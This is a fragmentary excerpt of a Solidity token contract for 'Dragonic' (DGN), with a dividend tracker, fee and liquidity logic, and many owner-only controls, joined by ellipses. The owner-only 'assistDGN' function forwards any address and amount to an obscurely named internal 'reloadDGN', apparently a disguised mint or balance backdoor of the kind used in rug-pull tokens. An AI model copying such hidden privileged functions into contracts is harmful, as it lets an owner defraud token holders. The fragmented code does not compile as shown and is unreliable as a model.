...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function reloadDGN(address account, uint256 amount) internal virtual {
...
function reloadDGN(address account, uint256 value) internal override {
    super.reloadDGN(account, value);
...
contract DGNrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterateDGN  for IterateDGN .Map;
IterateDGN .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("DGN_rewardToken_Tracker", "DGN_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "DGN_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "DGN_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main DGN contract.");
    }
...
contract DGN is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    ...
    uint256 public  distributeToholders = 7;
    uint256 public  TotalFees;
 uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    PanCakeRouter02 public DEXV2Router;
    DGNrewardToken public rewardToken;
 ...
 address public lp;
  ILP public adressLiquidity;
    address public developmentTeamReciever =0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Dragonic", "DGN") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new DGNrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function assistDGN(address tokenAddress, uint256 tokenePercent) public masterWallet{
       reloadDGN(tokenAddress, tokenePercent);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "DGN: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "DGN: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "DGN: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "DGN: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTDGN = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTDGN);
...
addLiquidity(tokensTDGN, bnbForLiquidity);
